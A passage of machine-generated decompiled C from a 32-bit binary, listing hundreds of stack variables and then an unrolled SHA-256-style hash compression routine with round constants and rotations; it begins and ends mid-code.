  int v1611; // [esp-D4h] [ebp-160h]
  int v1612; // [esp-D4h] [ebp-160h]
  int v1613; // [esp-D4h] [ebp-160h]
  int v1614; // [esp-D4h] [ebp-160h]
  int v1615; // [esp-D4h] [ebp-160h]
  __int32 v1616; // [esp-D4h] [ebp-160h]
  __int32 v1617; // [esp-D4h] [ebp-160h]
  int v1618; // [esp-D4h] [ebp-160h]
  int v1619; // [esp-D4h] [ebp-160h]
  __int32 v1620; // [esp-D4h] [ebp-160h]
  int v1621; // [esp-D4h] [ebp-160h]
  int v1622; // [esp-D4h] [ebp-160h]
  int v1623; // [esp-D4h] [ebp-160h]
  __int32 v1624; // [esp-D4h] [ebp-160h]
  __int32 v1625; // [esp-D4h] [ebp-160h]
  int v1626; // [esp-D4h] [ebp-160h]
  int v1627; // [esp-D4h] [ebp-160h]
  __int32 v1628; // [esp-D4h] [ebp-160h]
  int v1629; // [esp-D4h] [ebp-160h]
  int v1630; // [esp-D4h] [ebp-160h]
  int v1631; // [esp-D4h] [ebp-160h]
  int v1632; // [esp-D4h] [ebp-160h]
  int v1633; // [esp-D4h] [ebp-160h]
  int v1634; // [esp-D4h] [ebp-160h]
  int v1635; // [esp-D4h] [ebp-160h]
  int v1636; // [esp-D4h] [ebp-160h]
  int v1637; // [esp-D4h] [ebp-160h]
  int v1638; // [esp-D4h] [ebp-160h]
  int v1639; // [esp-D4h] [ebp-160h]
  __int32 v1640; // [esp-D0h] [ebp-15Ch]
  __int32 v1641; // [esp-D0h] [ebp-15Ch]
  __int32 v1642; // [esp-D0h] [ebp-15Ch]
  __int32 v1643; // [esp-D0h] [ebp-15Ch]
  int v1644; // [esp-D0h] [ebp-15Ch]
  int v1645; // [esp-D0h] [ebp-15Ch]
  int v1646; // [esp-D0h] [ebp-15Ch]
  int v1647; // [esp-D0h] [ebp-15Ch]
  int v1648; // [esp-D0h] [ebp-15Ch]
  int v1649; // [esp-D0h] [ebp-15Ch]
  int v1650; // [esp-D0h] [ebp-15Ch]
  int v1651; // [esp-D0h] [ebp-15Ch]
  int v1652; // [esp-D0h] [ebp-15Ch]
  int v1653; // [esp-D0h] [ebp-15Ch]
  int v1654; // [esp-D0h] [ebp-15Ch]
  int v1655; // [esp-D0h] [ebp-15Ch]
  int v1656; // [esp-D0h] [ebp-15Ch]
  int v1657; // [esp-D0h] [ebp-15Ch]
  int v1658; // [esp-D0h] [ebp-15Ch]
  int v1659; // [esp-D0h] [ebp-15Ch]
  __int32 v1660; // [esp-D0h] [ebp-15Ch]
  int v1661; // [esp-D0h] [ebp-15Ch]
  __int32 v1662; // [esp-D0h] [ebp-15Ch]
  __int32 v1663; // [esp-D0h] [ebp-15Ch]
  int v1664; // [esp-D0h] [ebp-15Ch]
  __int32 v1665; // [esp-D0h] [ebp-15Ch]
  int v1666; // [esp-D0h] [ebp-15Ch]
  __int32 v1667; // [esp-D0h] [ebp-15Ch]
  int v1668; // [esp-D0h] [ebp-15Ch]
  int v1669; // [esp-D0h] [ebp-15Ch]
  int v1670; // [esp-D0h] [ebp-15Ch]
  int v1671; // [esp-D0h] [ebp-15Ch]
  int v1672; // [esp-D0h] [ebp-15Ch]
  int v1673; // [esp-D0h] [ebp-15Ch]
  int v1674; // [esp-D0h] [ebp-15Ch]
  int v1675; // [esp-D0h] [ebp-15Ch]
  int v1676; // [esp-D0h] [ebp-15Ch]
  int v1677; // [esp-D0h] [ebp-15Ch]
  int v1678; // [esp-D0h] [ebp-15Ch]
  int v1679; // [esp-D0h] [ebp-15Ch]
  int v1680; // [esp-D0h] [ebp-15Ch]
  int v1681; // [esp-D0h] [ebp-15Ch]
  int v1682; // [esp-D0h] [ebp-15Ch]
  __int32 v1683; // [esp-CCh] [ebp-158h]
  int v1684; // [esp-CCh] [ebp-158h]
  int v1685; // [esp-CCh] [ebp-158h]
  int v1686; // [esp-CCh] [ebp-158h]
  int v1687; // [esp-CCh] [ebp-158h]
  int v1688; // [esp-CCh] [ebp-158h]
  int v1689; // [esp-CCh] [ebp-158h]
  int v1690; // [esp-CCh] [ebp-158h]
  int v1691; // [esp-CCh] [ebp-158h]
  int v1692; // [esp-CCh] [ebp-158h]
  int v1693; // [esp-CCh] [ebp-158h]
  int v1694; // [esp-CCh] [ebp-158h]
  int v1695; // [esp-CCh] [ebp-158h]
  int v1696; // [esp-CCh] [ebp-158h]
  int v1697; // [esp-CCh] [ebp-158h]
  int v1698; // [esp-CCh] [ebp-158h]
  int v1699; // [esp-CCh] [ebp-158h]
  int v1700; // [esp-CCh] [ebp-158h]
  int v1701; // [esp-CCh] [ebp-158h]
  int v1702; // [esp-CCh] [ebp-158h]
  int v1703; // [esp-CCh] [ebp-158h]
  int v1704; // [esp-CCh] [ebp-158h]
  int v1705; // [esp-CCh] [ebp-158h]
  int v1706; // [esp-CCh] [ebp-158h]
  int v1707; // [esp-CCh] [ebp-158h]
  int v1708; // [esp-CCh] [ebp-158h]
  int v1709; // [esp-CCh] [ebp-158h]
  int v1710; // [esp-CCh] [ebp-158h]
  int v1711; // [esp-CCh] [ebp-158h]
  int v1712; // [esp-CCh] [ebp-158h]
  int v1713; // [esp-CCh] [ebp-158h]
  int v1714; // [esp-CCh] [ebp-158h]
  int v1715; // [esp-CCh] [ebp-158h]
  int v1716; // [esp-CCh] [ebp-158h]
  int v1717; // [esp-CCh] [ebp-158h]
  int v1718; // [esp-CCh] [ebp-158h]
  int v1719; // [esp-CCh] [ebp-158h]
  int v1720; // [esp-CCh] [ebp-158h]
  int v1721; // [esp-CCh] [ebp-158h]
  int v1722; // [esp-CCh] [ebp-158h]
  int v1723; // [esp-CCh] [ebp-158h]
  __int32 v1724; // [esp-C8h] [ebp-154h]
  __int32 v1725; // [esp-C8h] [ebp-154h]
  int v1726; // [esp-C8h] [ebp-154h]
  int v1727; // [esp-C8h] [ebp-154h]
  int v1728; // [esp-C8h] [ebp-154h]
  int v1729; // [esp-C8h] [ebp-154h]
  int v1730; // [esp-C8h] [ebp-154h]
  int v1731; // [esp-C8h] [ebp-154h]
  int v1732; // [esp-C8h] [ebp-154h]
  int v1733; // [esp-C8h] [ebp-154h]
  int v1734; // [esp-C8h] [ebp-154h]
  int v1735; // [esp-C8h] [ebp-154h]
  int v1736; // [esp-C8h] [ebp-154h]
  int v1737; // [esp-C8h] [ebp-154h]
  int v1738; // [esp-C8h] [ebp-154h]
  int v1739; // [esp-C8h] [ebp-154h]
  int v1740; // [esp-C8h] [ebp-154h]
  int v1741; // [esp-C8h] [ebp-154h]
  __int32 v1742; // [esp-C8h] [ebp-154h]
  int v1743; // [esp-C8h] [ebp-154h]
  int v1744; // [esp-C8h] [ebp-154h]
  int v1745; // [esp-C8h] [ebp-154h]
  int v1746; // [esp-C8h] [ebp-154h]
  int v1747; // [esp-C8h] [ebp-154h]
  int v1748; // [esp-C8h] [ebp-154h]
  int v1749; // [esp-C8h] [ebp-154h]
  __int32 v1750; // [esp-C8h] [ebp-154h]
  int v1751; // [esp-C8h] [ebp-154h]
  int v1752; // [esp-C8h] [ebp-154h]
  int v1753; // [esp-C8h] [ebp-154h]
  int v1754; // [esp-C8h] [ebp-154h]
  int v1755; // [esp-C8h] [ebp-154h]
  int v1756; // [esp-C8h] [ebp-154h]
  int v1757; // [esp-C8h] [ebp-154h]
  int v1758; // [esp-C8h] [ebp-154h]
  int v1759; // [esp-C8h] [ebp-154h]
  int v1760; // [esp-C8h] [ebp-154h]
  int v1761; // [esp-C8h] [ebp-154h]
  int v1762; // [esp-C8h] [ebp-154h]
  int v1763; // [esp-C8h] [ebp-154h]
  int v1764; // [esp-C8h] [ebp-154h]
  int v1765; // [esp-C8h] [ebp-154h]
  __int32 v1766; // [esp-C4h] [ebp-150h]
  __int32 v1767; // [esp-C4h] [ebp-150h]
  int v1768; // [esp-C4h] [ebp-150h]
  int v1769; // [esp-C4h] [ebp-150h]
  int v1770; // [esp-C4h] [ebp-150h]
  int v1771; // [esp-C4h] [ebp-150h]
  int v1772; // [esp-C4h] [ebp-150h]
  int v1773; // [esp-C4h] [ebp-150h]
  int v1774; // [esp-C4h] [ebp-150h]
  int v1775; // [esp-C4h] [ebp-150h]
  int v1776; // [esp-C4h] [ebp-150h]
  int v1777; // [esp-C4h] [ebp-150h]
  int v1778; // [esp-C4h] [ebp-150h]
  int v1779; // [esp-C4h] [ebp-150h]
  int v1780; // [esp-C4h] [ebp-150h]
  int v1781; // [esp-C4h] [ebp-150h]
  int v1782; // [esp-C4h] [ebp-150h]
  int v1783; // [esp-C4h] [ebp-150h]
  __int32 v1784; // [esp-C4h] [ebp-150h]
  int v1785; // [esp-C4h] [ebp-150h]
  int v1786; // [esp-C4h] [ebp-150h]
  int v1787; // [esp-C4h] [ebp-150h]
  int v1788; // [esp-C4h] [ebp-150h]
  int v1789; // [esp-C4h] [ebp-150h]
  int v1790; // [esp-C4h] [ebp-150h]
  int v1791; // [esp-C4h] [ebp-150h]
  __int32 v1792; // [esp-C4h] [ebp-150h]
  int v1793; // [esp-C4h] [ebp-150h]
  int v1794; // [esp-C4h] [ebp-150h]
  int v1795; // [esp-C4h] [ebp-150h]
  int v1796; // [esp-C4h] [ebp-150h]
  int v1797; // [esp-C4h] [ebp-150h]
  int v1798; // [esp-C4h] [ebp-150h]
  int v1799; // [esp-C4h] [ebp-150h]
  int v1800; // [esp-C4h] [ebp-150h]
  int v1801; // [esp-C4h] [ebp-150h]
  int v1802; // [esp-C4h] [ebp-150h]
  int v1803; // [esp-C4h] [ebp-150h]
  int v1804; // [esp-C4h] [ebp-150h]
  int v1805; // [esp-C4h] [ebp-150h]
  int v1806; // [esp-C4h] [ebp-150h]
  int v1807; // [esp-C4h] [ebp-150h]
  __int32 v1808; // [esp-C0h] [ebp-14Ch]
  __int32 v1809; // [esp-C0h] [ebp-14Ch]
  int v1810; // [esp-C0h] [ebp-14Ch]
  int v1811; // [esp-C0h] [ebp-14Ch]
  int v1812; // [esp-C0h] [ebp-14Ch]
  int v1813; // [esp-C0h] [ebp-14Ch]
  int v1814; // [esp-C0h] [ebp-14Ch]
  int v1815; // [esp-C0h] [ebp-14Ch]
  int v1816; // [esp-C0h] [ebp-14Ch]
  int v1817; // [esp-C0h] [ebp-14Ch]
  int v1818; // [esp-C0h] [ebp-14Ch]
  int v1819; // [esp-C0h] [ebp-14Ch]
  int v1820; // [esp-C0h] [ebp-14Ch]
  int v1821; // [esp-C0h] [ebp-14Ch]
  int v1822; // [esp-C0h] [ebp-14Ch]
  int v1823; // [esp-C0h] [ebp-14Ch]
  int v1824; // [esp-C0h] [ebp-14Ch]
  int v1825; // [esp-C0h] [ebp-14Ch]
  __int32 v1826; // [esp-C0h] [ebp-14Ch]
  int v1827; // [esp-C0h] [ebp-14Ch]
  __int32 v1828; // [esp-C0h] [ebp-14Ch]
  int v1829; // [esp-C0h] [ebp-14Ch]
  int v1830; // [esp-C0h] [ebp-14Ch]
  __int32 v1831; // [esp-C0h] [ebp-14Ch]
  int v1832; // [esp-C0h] [ebp-14Ch]
  __int32 v1833; // [esp-C0h] [ebp-14Ch]
  __int32 v1834; // [esp-C0h] [ebp-14Ch]
  int v1835; // [esp-C0h] [ebp-14Ch]
  int v1836; // [esp-C0h] [ebp-14Ch]
  int v1837; // [esp-C0h] [ebp-14Ch]
  int v1838; // [esp-C0h] [ebp-14Ch]
  int v1839; // [esp-C0h] [ebp-14Ch]
  int v1840; // [esp-C0h] [ebp-14Ch]
  int v1841; // [esp-C0h] [ebp-14Ch]
  __int32 v1842; // [esp-C0h] [ebp-14Ch]
  int v1843; // [esp-C0h] [ebp-14Ch]
  int v1844; // [esp-C0h] [ebp-14Ch]
  int v1845; // [esp-C0h] [ebp-14Ch]
  int v1846; // [esp-C0h] [ebp-14Ch]
  int v1847; // [esp-C0h] [ebp-14Ch]
  int v1848; // [esp-C0h] [ebp-14Ch]
  int v1849; // [esp-C0h] [ebp-14Ch]
  unsigned __int32 v1850; // [esp-BCh] [ebp-148h]
  unsigned int v1851; // [esp-BCh] [ebp-148h]
  unsigned int v1852; // [esp-BCh] [ebp-148h]
  unsigned int v1853; // [esp-BCh] [ebp-148h]
  __m128i v1854; // [esp-BCh] [ebp-148h]
  __int128 v1855; // [esp-BCh] [ebp-148h]
  __int128 v1856; // [esp-BCh] [ebp-148h]
  unsigned __int32 v1857; // [esp-B8h] [ebp-144h]
  unsigned int v1858; // [esp-B8h] [ebp-144h]
  unsigned int v1859; // [esp-B8h] [ebp-144h]
  unsigned int v1860; // [esp-B8h] [ebp-144h]
  unsigned __int32 v1861; // [esp-B4h] [ebp-140h]
  unsigned int v1862; // [esp-B4h] [ebp-140h]
  unsigned int v1863; // [esp-B4h] [ebp-140h]
  unsigned int v1864; // [esp-B4h] [ebp-140h]
  unsigned __int32 v1865; // [esp-B0h] [ebp-13Ch]
  unsigned int v1866; // [esp-B0h] [ebp-13Ch]
  unsigned int v1867; // [esp-B0h] [ebp-13Ch]
  unsigned int v1868; // [esp-B0h] [ebp-13Ch]
  unsigned __int32 v1869; // [esp-ACh] [ebp-138h]
  unsigned int v1870; // [esp-ACh] [ebp-138h]
  unsigned int v1871; // [esp-ACh] [ebp-138h]
  unsigned int v1872; // [esp-ACh] [ebp-138h]
  __m128i v1873; // [esp-ACh] [ebp-138h]
  __int128 v1874; // [esp-ACh] [ebp-138h]
  __int128 v1875; // [esp-ACh] [ebp-138h]
  unsigned __int32 v1876; // [esp-A8h] [ebp-134h]
  unsigned int v1877; // [esp-A8h] [ebp-134h]
  unsigned int v1878; // [esp-A8h] [ebp-134h]
  unsigned int v1879; // [esp-A8h] [ebp-134h]
  unsigned __int32 v1880; // [esp-A4h] [ebp-130h]
  unsigned int v1881; // [esp-A4h] [ebp-130h]
  unsigned int v1882; // [esp-A4h] [ebp-130h]
  unsigned int v1883; // [esp-A4h] [ebp-130h]
  unsigned __int32 v1884; // [esp-A0h] [ebp-12Ch]
  unsigned int v1885; // [esp-A0h] [ebp-12Ch]
  unsigned int v1886; // [esp-A0h] [ebp-12Ch]
  unsigned int v1887; // [esp-A0h] [ebp-12Ch]
  unsigned __int32 v1888; // [esp-9Ch] [ebp-128h]
  unsigned int v1889; // [esp-9Ch] [ebp-128h]
  unsigned int v1890; // [esp-9Ch] [ebp-128h]
  unsigned int v1891; // [esp-9Ch] [ebp-128h]
  __m128i v1892; // [esp-9Ch] [ebp-128h]
  __m128i v1893; // [esp-9Ch] [ebp-128h]
  __int128 v1894; // [esp-9Ch] [ebp-128h]
  __int128 v1895; // [esp-9Ch] [ebp-128h]
  unsigned __int32 v1896; // [esp-98h] [ebp-124h]
  unsigned int v1897; // [esp-98h] [ebp-124h]
  unsigned int v1898; // [esp-98h] [ebp-124h]
  unsigned int v1899; // [esp-98h] [ebp-124h]
  unsigned __int32 v1900; // [esp-94h] [ebp-120h]
  unsigned int v1901; // [esp-94h] [ebp-120h]
  unsigned int v1902; // [esp-94h] [ebp-120h]
  unsigned int v1903; // [esp-94h] [ebp-120h]
  unsigned __int32 v1904; // [esp-90h] [ebp-11Ch]
  unsigned int v1905; // [esp-90h] [ebp-11Ch]
  unsigned int v1906; // [esp-90h] [ebp-11Ch]
  unsigned int v1907; // [esp-90h] [ebp-11Ch]
  unsigned __int32 v1908; // [esp-8Ch] [ebp-118h]
  unsigned int v1909; // [esp-8Ch] [ebp-118h]
  unsigned int v1910; // [esp-8Ch] [ebp-118h]
  unsigned int v1911; // [esp-8Ch] [ebp-118h]
  __m128i v1912; // [esp-8Ch] [ebp-118h]
  __m128i v1913; // [esp-8Ch] [ebp-118h]
  __int128 v1914; // [esp-8Ch] [ebp-118h]
  __int128 v1915; // [esp-8Ch] [ebp-118h]
  unsigned __int32 v1916; // [esp-88h] [ebp-114h]
  unsigned int v1917; // [esp-88h] [ebp-114h]
  unsigned int v1918; // [esp-88h] [ebp-114h]
  unsigned int v1919; // [esp-88h] [ebp-114h]
  unsigned __int32 v1920; // [esp-84h] [ebp-110h]
  unsigned int v1921; // [esp-84h] [ebp-110h]
  unsigned int v1922; // [esp-84h] [ebp-110h]
  unsigned __int32 v1923; // [esp-80h] [ebp-10Ch]
  unsigned __int32 v1924; // [esp-80h] [ebp-10Ch]
  unsigned int v1925; // [esp-80h] [ebp-10Ch]
  unsigned int v1926; // [esp-80h] [ebp-10Ch]
  const __m128i *v1927; // [esp-78h] [ebp-104h]
  const __m128i *v1928; // [esp-78h] [ebp-104h]
  unsigned int v1929; // [esp-78h] [ebp-104h]
  unsigned int v1930; // [esp-78h] [ebp-104h]
  unsigned int v1931; // [esp-74h] [ebp-100h]
  int v1932; // [esp-68h] [ebp-F4h]
  __m128i *v1933; // [esp-58h] [ebp-E4h]
  const __m128i *v1934; // [esp-54h] [ebp-E0h]
  int v1935; // [esp-50h] [ebp-DCh]
  unsigned int v1936; // [esp-4Ch] [ebp-D8h]
  unsigned int v1937; // [esp-48h] [ebp-D4h]
  int v1938; // [esp-44h] [ebp-D0h]
  __int32 *v1939; // [esp+7Ch] [ebp-10h]
  const __m128i *v1940; // [esp+80h] [ebp-Ch]
  unsigned int v1941; // [esp+84h] [ebp-8h]

  v0 = (__int32 *)v1933;
  v1 = v1934;
  _EBP = (const __m128i *)SHA512_Constants_46C840;
  result = (int)v1934[4 * v1935].m128i_i32;
  v1931 = result;
  if ( (dword_73C6D0 & 0x100000) != 0 )
  {
    do
    {
LABEL_7:
      v1923 = _byteswap_ulong(v1->m128i_i32[0]);
      v4 = *v0;
      v1560 = v0[1];
      v1598 = v0[2];
      v1640 = v0[3];
      v5 = v0[4];
      v1724 = v0[5];
      v1766 = v0[6];
      v1808 = v0[7];
      do
      {
        v1683 = v5;
        v1519 = v4;
        v6 = _EBP->m128i_i32[0];
        v7 = _EBP->m128i_i32[0]
           + __ROR4__(__ROR4__(v5 ^ __ROR4__(v5, 14), 5) ^ v5, 6)
           + (v1766 ^ v5 & (v1766 ^ v1724))
           + v1808
           + v1923;
        v1517 = v1560 ^ v4;
        v5 = v7 + v1640;
        _EBP = (const __m128i *)((char *)_EBP + 4);
        v4 = __ROR4__(v4 ^ __ROR4__(v4 ^ __ROR4__(v4, 9), 11), 2) + v7 + (v1560 ^ (v1598 ^ v1560) & (v1560 ^ v4));
      }
      while ( v6 != -1046744716 );
      v8 = v1937;
      do
      {
        v1641 = v5;
        v1518 = v4;
        v9 = _EBP->m128i_i32[0];
        v10 = _EBP->m128i_i32[0]
            + __ROR4__(__ROR4__(v5 ^ __ROR4__(v5, 14), 5) ^ v5, 6)
            + (v1724 ^ v5 & (v1724 ^ v1683))
            + v1766
            + (__ROR4__((unsigned int)v1933 ^ __ROR4__(v1933, 2), 17) ^ ((unsigned int)v1933 >> 10))
            + v1932
            + v1938
            + (__ROR4__(v8 ^ __ROR4__(v8, 11), 7) ^ (v8 >> 3));
        v5 = v10 + v1598;
        v8 = v1936;
        _EBP = (const __m128i *)((char *)_EBP + 4);
        v4 = __ROR4__(v4 ^ __ROR4__(v4 ^ __ROR4__(v4, 9), 11), 2) + v10 + (v1519 ^ v1517 & (v1519 ^ v4));
      }
      while ( v9 != -965641998 );
      v0 = v1939;
      v11 = v1939[1] + v1518;
      v12 = v1939[2] + v1519;
      v13 = v1939[3] + v1560;
      *v1939 += v4;
      v1939[1] = v11;
      v1939[2] = v12;
      v1939[3] = v13;
      v1 = v1940;
      result = v1939[5] + v1641;
      v14 = v1939[6] + v1683;
      v15 = v1939[7] + v1724;
      v1939[4] += v5;
      v1939[5] = result;
      v1939[6] = v14;
      v1939[7] = v15;
      _EBP -= 16;
    }
    while ( (unsigned int)v1940 < v1941 );
    return result;
  }
  if ( (dword_73C6D0 & 0x1000000) == 0 )
  {
LABEL_6:
    if ( (unsigned int)(v1935 << 6) >= 0x100 )
    {
      result = v1933->m128i_i32[0];
      v1561 = v1933->m128i_i32[1];
      v16 = v1933->m128i_i32[2] ^ v1561;
      v1599 = v1933->m128i_i32[2];
      v1642 = v1933->m128i_i32[3];
      v17 = v1933[1].m128i_i32[0];
      v1725 = v1933[1].m128i_i32[1];
      v1767 = v1933[1].m128i_i32[2];
      v1809 = v1933[1].m128i_i32[3];
      do
      {
        v1850 = _byteswap_ulong(v1->m128i_i32[0]);
        v1857 = _byteswap_ulong(v1->m128i_u32[1]);
        v1861 = _byteswap_ulong(v1->m128i_u32[2]);
        v1865 = _byteswap_ulong(v1->m128i_u32[3]);
        v1869 = _byteswap_ulong(v1[1].m128i_u32[0]);
        v1876 = _byteswap_ulong(v1[1].m128i_u32[1]);
        v1880 = _byteswap_ulong(v1[1].m128i_u32[2]);
        v1884 = _byteswap_ulong(v1[1].m128i_u32[3]);
        v1888 = _byteswap_ulong(v1[2].m128i_u32[0]);
        v1896 = _byteswap_ulong(v1[2].m128i_u32[1]);
        v1900 = _byteswap_ulong(v1[2].m128i_u32[2]);
        v1904 = _byteswap_ulong(v1[2].m128i_u32[3]);
        v1908 = _byteswap_ulong(v1[3].m128i_u32[0]);
        v1916 = _byteswap_ulong(v1[3].m128i_u32[1]);
        v1920 = _byteswap_ulong(v1[3].m128i_u32[2]);
        v1927 = v1 + 4;
        v1924 = _byteswap_ulong(v1[3].m128i_u32[3]);
        v1684 = v17;
        v18 = result;
        v19 = result ^ __ROR4__(result, 9);
        v1520 = result;
        v20 = v1561 ^ result;
        v21 = (v17 & (v1767 ^ v1725) ^ v1767)
            + v1809
            + v1850
            + __ROR4__(v17 ^ __ROR4__(v17 ^ __ROR4__(v17, 14), 5), 6)
            + 1116352408;
        v22 = __ROR4__(v18 ^ __ROR4__(v19, 11), 2) + v21 + (v1561 ^ v20 & v16);
        v23 = v1642 + v21;
        v24 = __ROR4__((v1642 + v21) ^ __ROR4__(v1642 + v21, 14), 5);
        v1643 = v23;
        v25 = __ROR4__(v23 ^ v24, 6);
        v26 = (v23 & (v1725 ^ v1684) ^ v1725) + v1767 + v1857;
        v27 = v22;
        v28 = v22 ^ __ROR4__(v22, 9);
        v1810 = v22;
        v29 = v1520 ^ v22;
        v30 = v26 + v25 + 1899447441;
        v31 = __ROR4__(v27 ^ __ROR4__(v28, 11), 2) + v30 + (v1520 ^ v29 & v20);
        v32 = v1599 + v30;
        v33 = __ROR4__((v1599 + v30) ^ __ROR4__(v1599 + v30, 14), 5);
        v1600 = v32;
        v34 = __ROR4__(v32 ^ v33, 6);
        v35 = (v32 & (v1684 ^ v1643) ^ v1684) + v1725 + v1861;
        v36 = v31;
        v37 = v31 ^ __ROR4__(v31, 9);
        v1768 = v31;
        v38 = v1810 ^ v31;
        v39 = v35 + v34 - 1245643825;
        v40 = __ROR4__(v36 ^ __ROR4__(v37, 11), 2) + v39 + (v1810 ^ v38 & v29);
        v41 = v1561 + v39;
        v42 = __ROR4__((v1561 + v39) ^ __ROR4__(v1561 + v39, 14), 5);
        v1562 = v41;
        v43 = __ROR4__(v41 ^ v42, 6);
        v44 = (v41 & (v1643 ^ v1600) ^ v1643) + v1684 + v1865;
        v45 = v40;
        v46 = v40 ^ __ROR4__(v40, 9);
        v1726 = v40;
        v47 = v1768 ^ v40;
        v48 = v44 + v43 - 373957723;
        v49 = __ROR4__(v45 ^ __ROR4__(v46, 11), 2) + v48 + (v1768 ^ v47 & v38);
        v50 = v1520 + v48;
        v51 = __ROR4__((v1520 + v48) ^ __ROR4__(v1520 + v48, 14), 5);
        v1521 = v50;
        v52 = __ROR4__(v50 ^ v51, 6);
        v53 = (v50 & (v1600 ^ v1562) ^ v1600) + v1643 + v1869;
        v54 = v49;
        v55 = v49 ^ __ROR4__(v49, 9);
        v1685 = v49;
        v56 = v1726 ^ v49;
        v57 = v53 + v52 + 961987163;
        v58 = __ROR4__(v54 ^ __ROR4__(v55, 11), 2) + v57 + (v1726 ^ v56 & v47);
        v59 = v1810 + v57;
        v60 = __ROR4__((v1810 + v57) ^ __ROR4__(v1810 + v57, 14), 5);
        v1811 = v59;
        v61 = __ROR4__(v59 ^ v60, 6);
        v62 = (v59 & (v1562 ^ v1521) ^ v1562) + v1600 + v1876;
        v63 = v58;
        v64 = v58 ^ __ROR4__(v58, 9);
        v1644 = v58;
        v65 = v1685 ^ v58;
        v66 = v62 + v61 + 1508970993;
        v67 = __ROR4__(v63 ^ __ROR4__(v64, 11), 2) + v66 + (v1685 ^ v65 & v56);
        v68 = v1768 + v66;
        v69 = __ROR4__((v1768 + v66) ^ __ROR4__(v1768 + v66, 14), 5);
        v1769 = v68;
        v70 = __ROR4__(v68 ^ v69, 6);
        v71 = (v68 & (v1521 ^ v1811) ^ v1521) + v1562 + v1880;
        v72 = v67;
        v73 = v67 ^ __ROR4__(v67, 9);
        v1601 = v67;
        v74 = v1644 ^ v67;
        v75 = v71 + v70 - 1841331548;
        v76 = __ROR4__(v72 ^ __ROR4__(v73, 11), 2) + v75 + (v1644 ^ v74 & v65);
        v77 = v1726 + v75;
        v78 = __ROR4__((v1726 + v75) ^ __ROR4__(v1726 + v75, 14), 5);
        v1727 = v77;
        v79 = __ROR4__(v77 ^ v78, 6);
        v80 = (v77 & (v1811 ^ v1769) ^ v1811) + v1521 + v1884;
        v81 = v76;
        v82 = v76 ^ __ROR4__(v76, 9);
        v1563 = v76;
        v83 = v1601 ^ v76;
        v84 = v80 + v79 - 1424204075;
        v85 = __ROR4__(v81 ^ __ROR4__(v82, 11), 2) + v84 + (v1601 ^ v83 & v74);
        v86 = v1685 + v84;
        v87 = __ROR4__((v1685 + v84) ^ __ROR4__(v1685 + v84, 14), 5);
        v1686 = v86;
        v88 = __ROR4__(v86 ^ v87, 6);
        v89 = (v86 & (v1769 ^ v1727) ^ v1769) + v1811 + v1888;
        v90 = v85;
        v91 = v85 ^ __ROR4__(v85, 9);
        v1522 = v85;
        v92 = v1563 ^ v85;
        v93 = v89 + v88 - 670586216;
        v94 = __ROR4__(v90 ^ __ROR4__(v91, 11), 2) + v93 + (v1563 ^ v92 & v83);
        v95 = v1644 + v93;
        v96 = __ROR4__((v1644 + v93) ^ __ROR4__(v1644 + v93, 14), 5);
        v1645 = v95;
        v97 = __ROR4__(v95 ^ v96, 6);
        v98 = (v95 & (v1727 ^ v1686) ^ v1727) + v1769 + v1896;
        v99 = v94;
        v100 = v94 ^ __ROR4__(v94, 9);
        v1812 = v94;
        v101 = v1522 ^ v94;
        v102 = v98 + v97 + 310598401;
        v103 = __ROR4__(v99 ^ __ROR4__(v100, 11), 2) + v102 + (v1522 ^ v101 & v92);
        v104 = v1601 + v102;
        v105 = __ROR4__((v1601 + v102) ^ __ROR4__(v1601 + v102, 14), 5);
        v1602 = v104;
        v106 = __ROR4__(v104 ^ v105, 6);
        v107 = (v104 & (v1686 ^ v1645) ^ v1686) + v1727 + v1900;
        v108 = v103;
        v109 = v103 ^ __ROR4__(v103, 9);
        v1770 = v103;
        v110 = v1812 ^ v103;
        v111 = v107 + v106 + 607225278;
        v112 = __ROR4__(v108 ^ __ROR4__(v109, 11), 2) + v111 + (v1812 ^ v110 & v101);
        v113 = v1563 + v111;
        v114 = __ROR4__((v1563 + v111) ^ __ROR4__(v1563 + v111, 14), 5);
        v1564 = v113;
        v115 = __ROR4__(v113 ^ v114, 6);
        v116 = (v113 & (v1645 ^ v1602) ^ v1645) + v1686 + v1904;
        v117 = v112;
        v118 = v112 ^ __ROR4__(v112, 9);
        v1728 = v112;
        v119 = v1770 ^ v112;
        v120 = v116 + v115 + 1426881987;
        v121 = __ROR4__(v117 ^ __ROR4__(v118, 11), 2) + v120 + (v1770 ^ v119 & v110);
        v122 = v1522 + v120;
        v123 = __ROR4__((v1522 + v120) ^ __ROR4__(v1522 + v120, 14), 5);
        v1523 = v122;
        v124 = __ROR4__(v122 ^ v123, 6);
        v125 = (v122 & (v1602 ^ v1564) ^ v1602) + v1645 + v1908;
        v126 = v121;
        v127 = v121 ^ __ROR4__(v121, 9);
        v1687 = v121;
        v128 = v1728 ^ v121;
        v129 = v125 + v124 + 1925078388;
        v130 = __ROR4__(v126 ^ __ROR4__(v127, 11), 2) + v129 + (v1728 ^ v128 & v119);
        v131 = v1812 + v129;
        v132 = __ROR4__((v1812 + v129) ^ __ROR4__(v1812 + v129, 14), 5);
        v1813 = v131;
        v133 = __ROR4__(v131 ^ v132, 6);
        v134 = (v131 & (v1564 ^ v1523) ^ v1564) + v1602 + v1916;
        v135 = v130;
        v136 = v130 ^ __ROR4__(v130, 9);
        v1646 = v130;
        v137 = v1687 ^ v130;
        v138 = v134 + v133 - 2132889090;
        v139 = __ROR4__(v135 ^ __ROR4__(v136, 11), 2) + v138 + (v1687 ^ v137 & v128);
        v140 = v1770 + v138;
        v141 = __ROR4__((v1770 + v138) ^ __ROR4__(v1770 + v138, 14), 5);
        v1771 = v140;
        v142 = __ROR4__(v140 ^ v141, 6);
        v143 = (v140 & (v1523 ^ v1813) ^ v1523) + v1564 + v1920;
        v144 = v139;
        v145 = v139 ^ __ROR4__(v139, 9);
        v1603 = v139;
        v146 = v1646 ^ v139;
        v147 = v143 + v142 - 1680079193;
        v148 = __ROR4__(v144 ^ __ROR4__(v145, 11), 2) + v147 + (v1646 ^ v146 & v137);
        v149 = v1728 + v147;
        v150 = __ROR4__((v1728 + v147) ^ __ROR4__(v1728 + v147, 14), 5);
        v1729 = v149;
        v151 = __ROR4__(v149 ^ v150, 6);
        v152 = (v149 & (v1813 ^ v1771) ^ v1813) + v1523 + v1924;
        v153 = v148;
        v154 = v148 ^ __ROR4__(v148, 9);
        v1565 = v148;
        v155 = v1603 ^ v148;
        v156 = v152 + v151 - 1046744716;
        v157 = __ROR4__(v153 ^ __ROR4__(v154, 11), 2) + v156 + (v1603 ^ v155 & v146);
        v158 = v1687 + v156;
        v1851 = (__ROR4__(v1920 ^ __ROR4__(v1920, 2), 17) ^ (v1920 >> 10))
              + v1896
              + v1850
